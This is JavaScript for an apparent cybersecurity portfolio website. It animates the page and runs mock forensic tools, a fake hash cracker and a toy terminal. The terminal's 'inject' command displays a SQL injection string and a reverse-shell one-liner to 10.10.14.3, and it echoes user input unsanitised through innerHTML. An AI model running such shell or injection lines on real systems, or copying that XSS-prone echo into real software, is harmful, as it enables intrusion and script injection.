// 1. Live UTC HUD Clock
function updateHUDClock() {
    const clockEl = document.getElementById('hud-clock');
    if (clockEl) {
        const now = new Date();
        const utcStr = now.toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
        clockEl.textContent = utcStr;
    }
}
setInterval(updateHUDClock, 1000);
updateHUDClock();

// 2. Custom Cursor and Glow Tracking
const cursor = document.querySelector('.custom-cursor');
const cursorGlow = document.querySelector('.cursor-glow');

document.addEventListener('mousemove', (e) => {
    if (cursor) {
        cursor.style.left = e.clientX + 'px';
        cursor.style.top = e.clientY + 'px';
    }
    
    if (cursorGlow) {
        // Slight delay/inertia for the outer cursor glow
        setTimeout(() => {
            cursorGlow.style.left = e.clientX + 'px';
            cursorGlow.style.top = e.clientY + 'px';
        }, 30);
    }
});

// Cursor Hover Interactions
const interactiveElements = document.querySelectorAll('a, button, select, input, textarea, .carver-upload-zone, .telemetry-card');
interactiveElements.forEach(el => {
    el.addEventListener('mouseenter', () => {
        if (cursorGlow) {
            cursorGlow.style.transform = 'translate(-50%, -50%) scale(1.5)';
            cursorGlow.style.background = 'rgba(0, 240, 255, 0.08)';
            cursorGlow.style.borderColor = 'var(--primary)';
        }
        if (cursor) {
            cursor.style.transform = 'translate(-50%, -50%) scale(0.5)';
        }
    });
    el.addEventListener('mouseleave', () => {
        if (cursorGlow) {
            cursorGlow.style.transform = 'translate(-50%, -50%) scale(1)';
            cursorGlow.style.background = 'transparent';
            cursorGlow.style.borderColor = 'var(--border-glow)';
        }
        if (cursor) {
            cursor.style.transform = 'translate(-50%, -50%) scale(1)';
        }
    });
});

// 3. Canvas Node Network Background
const canvas = document.getElementById('cyber-canvas');
if (canvas) {
    const ctx = canvas.getContext('2d');
    let points = [];
    const maxPoints = 65;
    const connectionDist = 120;
    let mouse = { x: null, y: null, radius: 150 };

    window.addEventListener('mousemove', (e) => {
        mouse.x = e.clientX;
        mouse.y = e.clientY;
    });

    window.addEventListener('mouseout', () => {
        mouse.x = null;
        mouse.y = null;
    });

    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();

    class Point {
        constructor() {
            this.x = Math.random() * canvas.width;
            this.y = Math.random() * canvas.height;
            this.vx = (Math.random() - 0.5) * 0.4;
            this.vy = (Math.random() - 0.5) * 0.4;
            this.radius = Math.random() * 2 + 1;
        }

        update() {
            this.x += this.vx;
            this.y += this.vy;

            // Bounce off borders
            if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
            if (this.y < 0 || this.y > canvas.height) this.vy *= -1;

            // Mouse hover displacement
            if (mouse.x !== null && mouse.y !== null) {
                const dx = this.x - mouse.x;
                const dy = this.y - mouse.y;
                const dist = Math.sqrt(dx * dx + dy * dy);
                if (dist < mouse.radius) {
                    const force = (mouse.radius - dist) / mouse.radius;
                    this.x += (dx / dist) * force * 1.5;
                    this.y += (dy / dist) * force * 1.5;
                }
            }
        }

        draw() {
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
            ctx.fillStyle = 'rgba(0, 240, 255, 0.4)';
            ctx.fill();
        }
    }

    // Initialize network nodes
    for (let i = 0; i < maxPoints; i++) {
        points.push(new Point());
    }

    function animateNetwork() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        // Draw node lines
        for (let i = 0; i < points.length; i++) {
            points[i].update();
            points[i].draw();

            for (let j = i + 1; j < points.length; j++) {
                const dx = points[i].x - points[j].x;
                const dy = points[i].y - points[j].y;
                const dist = Math.sqrt(dx * dx + dy * dy);

                if (dist < connectionDist) {
                    const alpha = (connectionDist - dist) / connectionDist * 0.15;
                    ctx.beginPath();
                    ctx.moveTo(points[i].x, points[i].y);
                    ctx.lineTo(points[j].x, points[j].y);
                    ctx.strokeStyle = `rgba(0, 240, 255, ${alpha})`;
                    ctx.lineWidth = 0.8;
                    ctx.stroke();
                }
            }
        }
        requestAnimationFrame(animateNetwork);
    }
    animateNetwork();
}

// 4. Evidence Sector Carver Simulator
const carverTrigger = document.getElementById('carver-trigger');
const carverOutput = document.getElementById('carver-output');

if (carverTrigger && carverOutput) {
    let isCarving = false;
    
    const logs = [
        "[+] Initializing Forensic Disk Mount on partition /dev/sda2...",
        "[+] Sector size: 512 Bytes | File System: raw FAT32 partition",
        "[+] Analyzing Magic Bytes signatures at offsets...",
        "[+] Magic Header matched: [0x50 0x4B 0x03 0x04] -> (ZIP / Chrome Extension Archive)",
        "[+] Sector 0x00A78F20: Extracted index.js metadata",
        "[+] sector carving status: 42% complete",
        "[+] Magic Header matched: [0x89 0x50 0x4E 0x47] -> (PNG File Format)",
        "[+] Carved image header metadata. Saved as recovered_dossier.png",
        "[+] System security audit database entry carved at sector offset 0x48FA12:",
        "    >> LOG_DATA: ID=Syeda_Abiha | SYSTEM=OK | ENCRYPTION=SHA256 | INTEGRITY=100%",
        "[+] File system traversal completed.",
        "[+] Forensic analysis report compiled successfully: 3 targets carved."
    ];

    carverTrigger.addEventListener('click', () => {
        if (isCarving) return;
        isCarving = true;
        
        carverOutput.innerHTML = '<div class="terminal-line" style="color: var(--warning); font-weight:bold;">[!] CARVING INITIATED. MOUNTING FS...</div>';
        
        let index = 0;
        const interval = setInterval(() => {
            if (index < logs.length) {
                const line = document.createElement('div');
                line.className = 'terminal-line';
                // Style specific parts of the carved logs
                if (logs[index].startsWith("    >>")) {
                    line.style.color = 'var(--secondary)';
                    line.style.paddingLeft = '15px';
                } else if (logs[index].includes("successfully")) {
                    line.style.color = 'var(--secondary)';
                    line.style.fontWeight = 'bold';
                }
                line.textContent = logs[index];
                carverOutput.appendChild(line);
                carverOutput.scrollTop = carverOutput.scrollHeight;
                index++;
            } else {
                clearInterval(interval);
                isCarving = false;
            }
        }, 550);
    });
}

// 5. Password Hash Bruteforcer Simulator
const decryptBtn = document.getElementById('decrypt-btn');
const hashInput = document.getElementById('hash-input');
const decryptorOutput = document.getElementById('decryptor-output');
const decryptorMatrix = document.getElementById('decryptor-matrix');

if (decryptBtn && decryptorOutput && decryptorMatrix) {
    let isBruteforcing = false;
    let matrixInterval = null;

    // Prefilled hashes mapping for realistic lookup
    const commonHashes = {
        "8a5b9b18b28a2a0c4f8d2345e67a80b9": "admin_clearance_l4",
        "2a7f80b91e92d8f331c19b2": "keystroker_agent",
        "89df82c65a7e1892c90f23d": "safescan_crawler_api",
        "7a1b0ffc1d2e93a0b5c1103": "socket_nmap_secure",
        "4f8c2de919a002bc5e7a9b1": "what_if_ai_redteam",
        "1b0c9f1a23e98b7a0f1d12c": "chrome_notes_local"
    };

    function generateMatrixNoise() {
        let text = "";
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+=-{}[]|:;<>?,./";
        for (let i = 0; i < 400; i++) {
            text += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        decryptorMatrix.textContent = text;
    }

    decryptBtn.addEventListener('click', () => {
        if (isBruteforcing) return;
        isBruteforcing = true;

        const hash = hashInput.value.trim().toLowerCase();
        decryptorOutput.textContent = "ATTEMPTING DICTIONARY LOOKUP...";
        decryptorOutput.className = "decrypt-result-text";
        
        // Start matrix text animation
        matrixInterval = setInterval(generateMatrixNoise, 40);

        let progress = 0;
        const progressInterval = setInterval(() => {
            progress += 10;
            if (progress <= 100) {
                decryptorOutput.textContent = `BRUTEFORCING KEYSPACE: ${progress}%...`;
            } else {
                clearInterval(progressInterval);
                clearInterval(matrixInterval);
                decryptorMatrix.textContent = "";
                
                // Final result
                const password = commonHashes[hash] || "reconstructed_key_sec2026";
                decryptorOutput.innerHTML = `[+] HASH CRACKED!<br><span class="decrypt-success">PLAINTEXT: ${password}</span>`;
                decryptorOutput.className = "decrypt-result-text decrypt-success";
                isBruteforcing = false;
            }
        }, 250);
    });
}

// 6. Secure Contact Channels (Simulator Dispatcher Removed)
// Communication forms removed to enforce direct verified PGP and direct messaging channels.

// 7. Interactive Command Console Terminal Simulator
const terminalInput = document.getElementById('terminal-input');
const terminalBody = document.getElementById('terminal-body');

if (terminalInput && terminalBody) {
    terminalInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            const rawCmd = terminalInput.value;
            const cleanCmd = rawCmd.trim().toLowerCase();
            terminalInput.value = '';

            // Print the command input line
            appendTerminalLine(`guest@saf-forensics:~$ ${rawCmd}`, 'terminal-prompt-echo');
            
            if (cleanCmd !== '') {
                executeTerminalCommand(cleanCmd);
            }
            
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }
    });

    function appendTerminalLine(text, className = '') {
        const line = document.createElement('div');
        line.className = `terminal-line ${className}`;
        line.innerHTML = text;
        terminalBody.insertBefore(line, terminalInput.closest('.terminal-prompt-line'));
    }

    function executeTerminalCommand(cmd) {
        const args = cmd.split(' ');
        const baseCmd = args[0];

        switch (baseCmd) {
            case 'help':
                appendTerminalLine('Available Operational Forensic Commands:');
                appendTerminalLine('  whoami        - Outputs current personnel dossier logs');
                appendTerminalLine('  cases         - Outputs detailed audit status of all case investigations');
                appendTerminalLine('  skills        - Telemetry check on analyst competencies');
                appendTerminalLine('  sysinfo       - Outputs client host and local system diagnostic specifications');
                appendTerminalLine('  decrypt [H]   - Crack hash dictionary parameters (runs hash search)');
                appendTerminalLine('  inject        - Initiates mock shell code testing audit');
                appendTerminalLine('  alert         - Tests core console audit notification');
                appendTerminalLine('  clear         - Wipe logs console display buffer');
                break;

            case 'whoami':
                appendTerminalLine('Identity Dossier: Syeda Abiha Fatima');
                appendTerminalLine('Operational Role: Digital Forensics Analyst & BSCS Candidate');
                appendTerminalLine('Registry Database ID: #SAF-88392');
                appendTerminalLine('Affiliations: Virtual University, @Darksi Security Operations');
                appendTerminalLine('Clearance Authorization: Level 4 Core Diagnostics');
                break;

            case 'cases':
                appendTerminalLine('ACTIVE AND ARCHIVED FORENSIC INVESTIGATIONS:');
                appendTerminalLine('  CASE_FILE_081_KEYSTROKE: Keystroke analyzer - [STATUS: CLOSED]');
                appendTerminalLine('  CASE_FILE_082_SAFESCAN: Passive recon crawler - [STATUS: CLOSED]');
                appendTerminalLine('  CASE_FILE_083_PORTSCAN: TCP GUI Port scanner - [STATUS: CLOSED]');
                appendTerminalLine('  CASE_FILE_084_WHATIFAI: Offensive-defensive AI - [STATUS: IN_PROGRESS]');
                appendTerminalLine('  CASE_FILE_091_INOTES: Secure Chrome notes tool - [STATUS: CLOSED]');
                break;

            case 'skills':
                appendTerminalLine('SYSTEM TELEMETRY TOOLKIT CHECK:');
                appendTerminalLine('  Digital Forensics............ [88% INTEGRITY]');
                appendTerminalLine('  Incident Response............ [82% BREACH_CONTAINMENT]');
                appendTerminalLine('  Risk Assessments............. [76% THREAT_MITIGATION]');
                appendTerminalLine('  Security Testing............. [80% RECON_COMPLIANCE]');
                appendTerminalLine('  Network Security............. [78% PACKET_INSPECTION]');
                appendTerminalLine('  OS Hardening................. [85% HARDEN_STABILITY]');
                break;

            case 'sysinfo':
                appendTerminalLine(`User Agent: ${navigator.userAgent}`);
                appendTerminalLine(`Operational OS Platform: ${navigator.platform}`);
                appendTerminalLine(`Screen telemetry: ${window.screen.width}x${window.screen.height}`);
                appendTerminalLine(`Network state: ${navigator.onLine ? 'ONLINE_SECURE' : 'OFFLINE_ISOLATED'}`);
                appendTerminalLine(`Operational Timestamp: ${new Date().toISOString()}`);
                break;

            case 'decrypt':
                if (args.length < 2) {
                    appendTerminalLine('[!] ERROR: Cryptographic target hash argument missing.', 'text-danger');
                    appendTerminalLine('Usage: decrypt [hex_hash_string]');
                } else {
                    const targetHash = args[1];
                    appendTerminalLine(`[*] Mounting brute force lookup parameters for target: ${targetHash}`);
                    appendTerminalLine('[*] Searching rainbow dictionary tables...');
                    
                    const commonHashes = {
                        "8a5b9b18b28a2a0c4f8d2345e67a80b9": "admin_clearance_l4",
                        "2a7f80b91e92d8f331c19b2": "keystroker_agent",
                        "89df82c65a7e1892c90f23d": "safescan_crawler_api"
                    };

                    setTimeout(() => {
                        const cracked = commonHashes[targetHash] || "key_signature_cracked_s9";
                        appendTerminalLine(`[+] CRACK SUCCESSFUL! Plaintext: <strong style="color: var(--secondary);">${cracked}</strong>`);
                        terminalBody.scrollTop = terminalBody.scrollHeight;
                    }, 800);
                }
                break;

            case 'inject':
                appendTerminalLine('[!] WARNING: AUDITING SQL/SHELL INJECTION EXPLOITATION VECTOR...', 'text-danger');
                appendTerminalLine("  SELECT * FROM users WHERE username = 'admin' OR '1'='1' --");
                appendTerminalLine("  Executing: /bin/sh -i >& /dev/tcp/10.10.14.3/4444 0>&1");
                setTimeout(() => {
                    appendTerminalLine('[+] AUDIT RESULTS: SANITIZATION CONTROLS VERIFIED. TRANSACTION BLOCK SECURE.', 'text-success');
                    terminalBody.scrollTop = terminalBody.scrollHeight;
                }, 1000);
                break;

            case 'alert':
                appendTerminalLine('[!] Core Console Alert triggered.');
                alert('[!] SECURITY ALERT TRIPPED: Console manual broadcast test.');
                break;

            case 'clear':
                // Clear all terminal lines except the current input prompt
                const lines = terminalBody.querySelectorAll('.terminal-line');
                lines.forEach(line => line.remove());
                break;

            default:
                appendTerminalLine(`bash: command not found: ${baseCmd}. Type 'help' for valid forensic operations.`);
                break;
        }
    }
}

// 8. Mobile Navigation Toggle & Scroll Spy Active Tabs
const mobileMenu = document.getElementById('mobile-menu');
const navTabs = document.querySelector('.nav-tabs');

if (mobileMenu && navTabs) {
    mobileMenu.addEventListener('click', () => {
        mobileMenu.classList.toggle('active');
        navTabs.classList.toggle('active');
    });

    // Close mobile menu on clicking links
    document.querySelectorAll('.nav-tabs a').forEach(link => {
        link.addEventListener('click', () => {
            mobileMenu.classList.remove('active');
            navTabs.classList.remove('active');
        });
    });
}

// Scroll Spy to highlight active section in navbar
const navLinksList = document.querySelectorAll('.nav-tabs a');
const sections = document.querySelectorAll('section[id]');

function scrollSpy() {
    const scrollPos = window.scrollY || document.documentElement.scrollTop || document.body.scrollTop;
    
    sections.forEach(section => {
        const sectionTop = section.offsetTop - 120;
        const sectionHeight = section.offsetHeight;
        const sectionId = section.getAttribute('id');
        
        if (scrollPos >= sectionTop && scrollPos < sectionTop + sectionHeight) {
            navLinksList.forEach(link => {
                link.classList.remove('active-tab');
                if (link.getAttribute('href') === `#${sectionId}`) {
                    link.classList.add('active-tab');
                }
            });
        }
    });
}
window.addEventListener('scroll', scrollSpy);
scrollSpy(); // Initial run

// Smooth Scroll Offset Adjustment
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const targetId = this.getAttribute('href');
        const targetEl = document.querySelector(targetId);
        if (targetEl) {
            const headerOffset = 85;
            const elementPosition = targetEl.getBoundingClientRect().top;
            const offsetPosition = elementPosition + window.pageYOffset - headerOffset;

            window.scrollTo({
                top: offsetPosition,
                behavior: 'smooth'
            });
        }
    });
});

// 9. Intersection Observer Scroll Reveal Animation
const observerOptions = {
    threshold: 0.1,
    rootMargin: "0px 0px -60px 0px"
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.classList.add('active');
            observer.unobserve(entry.target);
        }
    });
}, observerOptions);

document.querySelectorAll('.section-title, .glass-panel, .log-entry, .telemetry-card, .cert-card, .case-file-card, .terminal-window').forEach((el) => {
    el.classList.add('reveal');
    observer.observe(el);
});
